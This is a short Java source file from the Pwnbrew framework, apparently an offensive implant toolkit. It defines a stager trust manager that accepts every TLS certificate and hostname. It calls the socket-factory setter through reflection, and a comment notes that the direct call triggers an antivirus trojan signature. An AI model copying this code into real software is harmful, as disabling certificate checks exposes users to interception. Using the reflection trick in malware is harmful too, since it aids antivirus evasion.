/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


package stager;

import java.net.URLConnection;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public class StagerTrustManager implements X509TrustManager, HostnameVerifier {
    
    @Override
    public X509Certificate[] getAcceptedIssuers(){
        return new X509Certificate[0];
    }

    @Override
    public void checkClientTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString){
    }

    @Override
    public void checkServerTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString){
    }

    @Override
    public boolean verify(String paramString, SSLSession paramSSLSession){
        return true;
    }

    public static void setTrustManager(URLConnection paramURLConnection) throws Exception {
        
        if ((paramURLConnection instanceof HttpsURLConnection)) {
            HttpsURLConnection localHttpsURLConnection = (HttpsURLConnection)paramURLConnection;
            StagerTrustManager localPayloadTrustManager = new StagerTrustManager();
            SSLContext localSSLContext = SSLContext.getInstance("TLS");
            localSSLContext.init(null, new TrustManager[] { localPayloadTrustManager }, new SecureRandom());
            HttpsURLConnection.class.getMethod("setSSLSocketFactory", 
                              new Class[] { SSLSocketFactory.class }).invoke(localHttpsURLConnection, new Object[] { localSSLContext.getSocketFactory() });
//            localHttpsURLConnection.setSSLSocketFactory(localSSLContext.getSocketFactory()); //Signature Java.Trojan.GenericGB.57
            localHttpsURLConnection.setHostnameVerifier(localPayloadTrustManager);
        }
    }
}
